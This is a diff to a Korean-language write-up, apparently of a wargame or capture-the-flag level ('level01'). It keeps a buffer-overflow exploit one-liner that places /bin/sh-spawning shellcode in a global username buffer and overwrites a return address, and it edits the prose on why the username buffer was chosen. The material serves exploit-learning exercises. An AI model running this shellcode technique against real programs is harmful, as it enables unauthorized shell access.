@@ -108,6 +108,6 @@ nope, incorrect password...
 cat <(python -c 'print "dat_wil." + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 220 + "A" * 79 + "\x48\xa0\x04\x08",') - | ./level01
 ```
 
-추가적으로 username은 전역 변수에 저장되고 userpass는 스택에 저장되므로 쉘코드의 손상 위험이 조금 더 적은 username쪽에 쉘코드를 넣었다.
+추가적으로 username은 전역 변수에 저장되고 userpass는 스택에 저장되므로 주소 계산이 편리한 username쪽에 쉘코드를 넣었다.
 
 username체크 로직에도 문자열 맨 앞부분만 비교하기 때문에 dat_wil뒤에 원하는 문자열을 삽입할 수 있었다.
